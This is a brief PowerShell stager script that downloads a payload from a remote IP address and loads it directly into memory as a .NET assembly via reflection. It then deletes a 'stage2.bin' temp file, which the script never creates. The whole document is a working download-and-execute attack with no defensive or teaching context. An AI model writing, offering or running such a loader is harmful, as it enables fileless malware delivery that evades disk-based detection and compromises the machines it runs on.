
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://203.0.113.79/payload.bin"
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($PayloadUrl)
[Reflection.Assembly]::Load($StageBytes)
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
